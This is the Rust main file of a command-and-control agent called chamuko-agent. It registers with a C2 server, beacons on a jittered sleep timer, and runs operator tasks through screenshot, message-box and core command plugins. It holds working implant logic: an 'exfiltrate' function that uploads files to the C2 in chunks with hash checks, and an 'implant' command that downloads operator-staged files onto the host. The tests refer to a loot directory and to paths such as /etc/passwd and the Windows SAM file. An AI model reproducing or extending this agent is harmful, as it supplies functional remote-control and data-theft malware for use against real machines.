use std::env;

use base64::Engine;
use std::process::ExitCode;
use std::time::Duration;

use chamuko_core::PluginRegistry;
use chamuko_plugin_api::LifecycleEvent;
use chamuko_protocol::{AgentInfo, Task, TaskResult};

mod client;
mod commands;
mod messagebox;
mod screenshot;

use client::{C2Client, C2Error};
use commands::core_plugin;
use messagebox::messagebox_plugin;
use screenshot::ScreenshotPlugin;

struct Config {
    c2_url: String,
    sleep: u64,
    jitter: u64,
    name: String,
    token: Option<String>,
    once: bool,
}

const FALLBACK_C2_URL: &str = "http://127.0.0.1:8080";
const FALLBACK_SLEEP: u64 = 10;
const FALLBACK_JITTER: u64 = 3;

fn default_c2_url() -> String {
    option_env!("CHAMUKO_C2_URL")
        .unwrap_or(FALLBACK_C2_URL)
        .to_string()
}

fn default_sleep() -> u64 {
    option_env!("CHAMUKO_SLEEP")
        .and_then(|s| s.parse().ok())
        .unwrap_or(FALLBACK_SLEEP)
}

fn default_jitter() -> u64 {
    option_env!("CHAMUKO_JITTER")
        .and_then(|s| s.parse().ok())
        .unwrap_or(FALLBACK_JITTER)
}

fn default_name() -> String {
    option_env!("CHAMUKO_NAME").unwrap_or("").to_string()
}

fn default_token() -> Option<String> {
    option_env!("CHAMUKO_TOKEN")
        .filter(|t| !t.is_empty())
        .map(str::to_string)
}

fn parse_u64(s: &str, fallback: u64) -> u64 {
    s.parse().unwrap_or(fallback)
}

const HELP: &str = "chamuko-agent\n\
                    --url <url>     C2 server URL\n\
                    --sleep <s>     base beacon sleep seconds\n\
                    --jitter <s>    max random jitter seconds\n\
                    --name <name>   agent label\n\
                    --token <tok>   C2 auth token\n\
                    --once          run a single beacon then exit\n\
                    --help          show this help";

impl Config {
    fn from_args() -> Self {
        let mut config = Self {
            c2_url: default_c2_url(),
            sleep: default_sleep(),
            jitter: default_jitter(),
            name: default_name(),
            token: default_token(),
            once: false,
        };

        let args: Vec<String> = env::args().skip(1).collect();
        let mut i = 0;
        while i < args.len() {
            let next = args.get(i + 1).cloned();
            let mut consumed = true;
            match args[i].as_str() {
                "--url" | "-u" => match next {
                    Some(v) => config.c2_url = v,
                    None => consumed = false,
                },
                "--sleep" | "-s" => match next {
                    Some(v) => config.sleep = parse_u64(&v, config.sleep),
                    None => consumed = false,
                },
                "--jitter" | "-j" => match next {
                    Some(v) => config.jitter = parse_u64(&v, config.jitter),
                    None => consumed = false,
                },
                "--name" | "-n" => match next {
                    Some(v) => config.name = v,
                    None => consumed = false,
                },
                "--token" | "-t" => match next {
                    Some(v) => config.token = Some(v).filter(|t: &String| !t.is_empty()),
                    None => consumed = false,
                },
                "--once" => {
                    config.once = true;
                    consumed = false;
                }
                "--help" | "-h" => {
                    println!("{HELP}");
                    std::process::exit(0);
                }
                other => {
                    eprintln!("unknown argument: {other}");
                    consumed = false;
                }
            }
            i += if consumed { 2 } else { 1 };
        }

        config
    }
}

fn jitter_sleep(base: u64, jitter: u64) {
    let extra = if jitter > 0 {
        rand::random::<u64>() % jitter
    } else {
        0
    };
    std::thread::sleep(Duration::from_secs(base + extra));
}

/// Runs one task and reports back what happened. A command that produced an
/// attachment gets it shipped to the C2 before the result is returned, so the
/// operator sees the file and the message together.
fn execute_task(
    registry: &mut PluginRegistry,
    client: &C2Client,
    agent_id: &str,
    task: &Task,
) -> TaskResult {
    let started = std::time::Instant::now();
    let cwd = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));

    let mut result = match registry.execute(&task.command, &task.args, &cwd) {
        Ok(out) => {
            let mut text = out.stdout.clone();
            if let Some(attachment) = out.attachment {
                match exfiltrate(client, agent_id, &attachment) {
                    Ok(note) => {
                        text.push('\n');
                        text.push_str(&note);
                    }
                    Err(e) => {
                        return TaskResult {
                            task_id: task.id.clone(),
                            output: String::new(),
                            error: Some(e),
                            exit_code: Some(1),
                            duration_ms: Some(started.elapsed().as_millis() as u64),
                        };
                    }
                }
            }
            TaskResult {
                task_id: task.id.clone(),
                output: text,
                error: None,
                exit_code: Some(out.exit_code),
                duration_ms: None,
            }
        }
        Err(e) => TaskResult {
            task_id: task.id.clone(),
            output: String::new(),
            error: Some(e.to_string()),
            exit_code: None,
            duration_ms: None,
        },
    };
    result.duration_ms = Some(started.elapsed().as_millis() as u64);
    result
}


/// Ships an attachment to the C2 in chunks and verifies the hash on both ends.
fn exfiltrate(
    client: &C2Client,
    agent_id: &str,
    attachment: &chamuko_plugin_api::Attachment,
) -> Result<String, String> {
    let data = &attachment.data;
    let local = chamuko_protocol::sha256_hex(data);
    let transfer = format!("up-{}-{}", agent_id, chamuko_protocol::now_secs());
    let chunks = chamuko_protocol::chunk_bytes(&transfer, data);
    let total = chunks.len();
    let mut last = None;

    for chunk in chunks {
        last = Some(
            client
                .upload_chunk(agent_id, &attachment.name, chunk)
                .map_err(|e| {
                    format!("exfil: chunk upload failed, transfer {transfer} incomplete: {e}")
                })?,
        );
    }

    let done = last.ok_or("exfil: nothing to send")?;
    if !done.complete {
        return Err(format!(
            "exfil: C2 accepted {}/{} chunks only",
            done.received, done.total
        ));
    }
    if let Some(remote) = done.sha256 {
        if remote != local {
            return Err(format!(
                "exfil: C2 stored a different file (sent {local}, stored {remote})"
            ));
        }
    }

    Ok(format!(
        "sent {} ({} bytes, {total} chunk(s), sha256 verified)",
        attachment.name,
        data.len()
    ))
}

/// Pulls a file the operator staged for this agent and writes it locally.
/// The hash the C2 advertised is checked before anything touches the disk.
fn implant(client: &C2Client, registry: &mut PluginRegistry, transfer: &str, path: &str) -> Result<String, String> {
    let mut buffer = Vec::new();
    let mut index = 0u32;
    let mut expected: Option<String> = None;

    loop {
        let resp = client
            .download_chunk(transfer, index)
            .map_err(|e| format!("implant: chunk {index} failed: {e}"))?;
        if let Some(hash) = resp.sha256.clone() {
            expected = Some(hash);
        }
        let bytes = resp
            .chunk
            .bytes()
            .map_err(|e| format!("implant: chunk {index} bad base64: {e}"))?;
        buffer.extend_from_slice(&bytes);

        index += 1;
        if index >= resp.chunk.total {
            break;
        }
    }

    let actual = chamuko_protocol::sha256_hex(&buffer);
    if let Some(want) = expected {
        if want != actual {
            return Err(format!(
                "implant: hash mismatch, refusing to write (expected {want}, got {actual})"
            ));
        }
    }

    let encoded = base64::engine::general_purpose::STANDARD.encode(&buffer);
    let args = vec![path.to_string(), encoded];
    let cwd = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
    match registry.execute("upload", &args, &cwd) {
        Ok(out) => Ok(format!("{} (sha256 {actual} verified)", out.stdout)),
        Err(e) => Err(format!("implant: write failed: {e}")),
    }
}

/// Registers with the C2 and adopts the sleep/jitter it hands back.
fn register(
    client: &C2Client,
    info: &AgentInfo,
    sleep: &mut u64,
    jitter: &mut u64,
) -> Result<String, C2Error> {
    let resp = client.register(info, *sleep, *jitter)?;
    *sleep = resp.sleep;
    *jitter = resp.jitter;
    eprintln!(
        "registered as agent {} (sleep={}s jitter={}s)",
        resp.id, resp.sleep, resp.jitter
    );
    Ok(resp.id)
}

fn run(config: &Config, registry: &mut PluginRegistry) -> Result<(), C2Error> {
    let client = C2Client::new(config.c2_url.clone(), config.token.clone());
    let info = AgentInfo::local(config.name.clone());

    let mut sleep = config.sleep;
    let mut jitter = config.jitter;
    let mut id = register(&client, &info, &mut sleep, &mut jitter)?;

    loop {
        let beacon = match client.beacon(&id) {
            Ok(beacon) => beacon,
            Err(e) if e.is_unknown_agent() => {
                eprintln!("C2 no longer knows {id}; re-registering");
                id = register(&client, &info, &mut sleep, &mut jitter)?;
                continue;
            }
            Err(e) => {
                eprintln!("beacon error: {e}");
                if config.once {
                    return Ok(());
                }
                jitter_sleep(sleep, jitter);
                continue;
            }
        };

        if let Some(value) = beacon.sleep {
            sleep = value;
        }
        if let Some(value) = beacon.jitter {
            jitter = value;
        }

        let mut results = Vec::with_capacity(beacon.tasks.len());
        for task in &beacon.tasks {
            // `implant` is driven by the beacon loop, not by a plugin, so it
            // must be handled before dispatching to the registry.
            let result = if task.command == "help" {
                TaskResult {
                    task_id: task.id.clone(),
                    output: format!("commands:\n{}", registry.help()),
                    error: None,
                    exit_code: Some(0),
                    duration_ms: Some(0),
                }
            } else if task.command == "implant" {
                let transfer = task.args.first().cloned().unwrap_or_default();
                let path = task.args.get(1).cloned().unwrap_or_default();
                let started = std::time::Instant::now();
                let outcome = implant(&client, registry, &transfer, &path);
                let (output, error) = match outcome {
                    Ok(note) => (note, None),
                    Err(e) => (String::new(), Some(e)),
                };
                TaskResult {
                    task_id: task.id.clone(),
                    output,
                    exit_code: Some(if error.is_some() { 1 } else { 0 }),
                    error,
                    duration_ms: Some(started.elapsed().as_millis() as u64),
                }
            } else {
                execute_task(registry, &client, &id, task)
            };

            if let Some(err) = &result.error {
                eprintln!("task {} error: {err}", task.id);
            }
            results.push(result);
        }

        if let Err(e) = client.post_results(&id, results) {
            eprintln!("failed to post results: {e}");
            if e.is_unknown_agent() {
                id = register(&client, &info, &mut sleep, &mut jitter)?;
                continue;
            }
        }

        if config.once {
            return Ok(());
        }
        jitter_sleep(sleep, jitter);
    }
}

fn main() -> ExitCode {
    let config = Config::from_args();

    let mut registry = PluginRegistry::new();
    if let Err(e) = registry.register(Box::new(messagebox_plugin())) {
        eprintln!("failed to register messagebox plugin: {e}");
        return ExitCode::FAILURE;
    }
    if let Err(e) = registry.register(Box::new(ScreenshotPlugin::new())) {
        eprintln!("failed to register screenshot plugin: {e}");
        return ExitCode::FAILURE;
    }
    if let Err(e) = registry.register(Box::new(core_plugin())) {
        eprintln!("failed to register core plugin: {e}");
        return ExitCode::FAILURE;
    }

    let mut failures = registry.dispatch(LifecycleEvent::Startup);
    eprintln!(
        "chamuko-agent: {} plugin(s); C2={} sleep={}s jitter={}s name='{}' auth={}",
        registry.len(),
        config.c2_url,
        config.sleep,
        config.jitter,
        config.name,
        if config.token.is_some() { "token" } else { "none" }
    );

    if let Err(e) = run(&config, &mut registry) {
        eprintln!("agent error: {e}");
        failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
        for f in &failures {
            eprintln!("{f}");
        }
        return ExitCode::FAILURE;
    }

    failures.extend(registry.dispatch(LifecycleEvent::Shutdown));
    for f in &failures {
        eprintln!("{f}");
    }

    if failures.is_empty() {
        ExitCode::SUCCESS
    } else {
        ExitCode::FAILURE
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn attachment_names_cannot_escape_the_loot_directory() {
        use chamuko_plugin_api::sanitize_attachment_name;
        assert_eq!(sanitize_attachment_name("../../etc/passwd"), "passwd");
        assert_eq!(sanitize_attachment_name(r"C:\Windows\SAM"), "SAM");
        assert_eq!(sanitize_attachment_name(".."), "attachment");
        assert_eq!(sanitize_attachment_name(""), "attachment");
    }

    #[test]
    fn attachments_carry_their_own_hash_source() {
        use chamuko_plugin_api::Attachment;
        let data = b"contenido de prueba".to_vec();
        let attachment = Attachment::new("nota.txt", data.clone()).unwrap();
        assert_eq!(attachment.name, "nota.txt");
        assert_eq!(chamuko_protocol::sha256_hex(&attachment.data), chamuko_protocol::sha256_hex(&data));
    }

    #[test]
    fn empty_attachments_are_rejected() {
        use chamuko_plugin_api::Attachment;
        assert!(Attachment::new("x", Vec::new()).is_err());
    }

    #[test]
    fn oversized_attachments_are_rejected_before_sending() {
        use chamuko_plugin_api::{Attachment, MAX_ATTACHMENT_BYTES};
        let too_big = vec![0u8; MAX_ATTACHMENT_BYTES + 1];
        assert!(Attachment::new("big.bin", too_big).is_err());
    }
}
